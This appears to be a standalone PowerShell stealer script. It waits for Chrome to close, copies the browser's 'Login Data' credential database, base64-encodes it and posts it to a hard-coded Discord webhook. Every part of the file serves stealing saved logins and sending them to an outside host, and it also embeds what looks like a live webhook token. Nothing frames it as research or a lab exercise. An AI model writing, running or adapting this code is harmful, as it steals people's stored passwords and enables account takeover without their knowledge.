$filePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
$copyPath = "$env:TEMP\LoginDataCopy"

# Function to check if Chrome is running
function Wait-ForChromeToClose {
    while (Get-Process -Name "chrome" -ErrorAction SilentlyContinue) {
        Write-Host "Waiting for Chrome to close..."
        Start-Sleep -Seconds 3
    }
}

# Wait until Chrome closes
Wait-ForChromeToClose

try {
    Copy-Item -LiteralPath $filePath -Destination $copyPath -Force -ErrorAction Stop
} catch {
    Write-Host "Failed to copy file. It might still be locked."
    exit
}

# Read file bytes from the copy
$fileBytes = [System.IO.File]::ReadAllBytes($copyPath)
$fileBase64 = [Convert]::ToBase64String($fileBytes)

# Limit preview length to avoid too large Discord messages
if ($fileBase64.Length -gt 1500) {
    $fileBase64 = $fileBase64.Substring(0, 1500) + "..."
}

# Prepare JSON payload
$jsonPayload = '{"content":"Base64 preview of Login Data:`n```' + $fileBase64 + '```"}'

# Your Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1374075895941169322/0q_M5862QHhmUHeIUIu9b0Y_L2feBqu-tbTz3gsbEiASX5HtOc8gwfh5fNMajSnbCrOq"

# Send to Discord
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType 'application/json'

Write-Host "Base64 preview sent to Discord webhook."
